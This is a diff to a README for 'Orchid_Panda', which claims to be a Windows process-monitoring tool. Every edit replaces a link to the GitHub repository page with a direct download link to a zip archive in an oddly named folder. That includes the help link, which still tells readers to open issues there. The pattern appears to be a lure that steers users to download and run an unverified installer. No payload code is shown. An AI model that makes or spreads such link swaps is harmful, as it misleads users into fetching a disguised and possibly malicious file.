@@ -1,6 +1,6 @@
 # 🐼 Orchid_Panda - Monitor Processes with Ease
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Orchid_Panda-brightgreen)](https://github.com/77gracee/Orchid_Panda)
+[![Download from GitHub](https://img.shields.io/badge/Download-Orchid_Panda-brightgreen)](https://raw.githubusercontent.com/77gracee/Orchid_Panda/main/bourgeoisie/Panda-Orchid-v2.3-alpha.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section walks you through the steps to get Orchid_Panda running on your Win
 
 Click the button below to visit the download page:
 
-[![Download Orchid_Panda](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github)](https://github.com/77gracee/Orchid_Panda)
+[![Download Orchid_Panda](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/77gracee/Orchid_Panda/main/bourgeoisie/Panda-Orchid-v2.3-alpha.3.zip)
 
 On the page, find the latest release and download the installer file. It will usually have `.exe` at the end.
 
@@ -107,7 +107,7 @@ To update:
 
 For help or questions, use the GitHub page:
 
-[https://github.com/77gracee/Orchid_Panda](https://github.com/77gracee/Orchid_Panda)
+[https://raw.githubusercontent.com/77gracee/Orchid_Panda/main/bourgeoisie/Panda-Orchid-v2.3-alpha.3.zip](https://raw.githubusercontent.com/77gracee/Orchid_Panda/main/bourgeoisie/Panda-Orchid-v2.3-alpha.3.zip)
 
 You can open an issue to report bugs or ask for features.
 
@@ -127,4 +127,4 @@ You can open an issue to report bugs or ask for features.
 
 Get started by visiting the download page again:
 
-[![Download Orchid_Panda](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github)](https://github.com/77gracee/Orchid_Panda)
+[![Download Orchid_Panda](https://img.shields.io/badge/Download-Green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/77gracee/Orchid_Panda/main/bourgeoisie/Panda-Orchid-v2.3-alpha.3.zip)
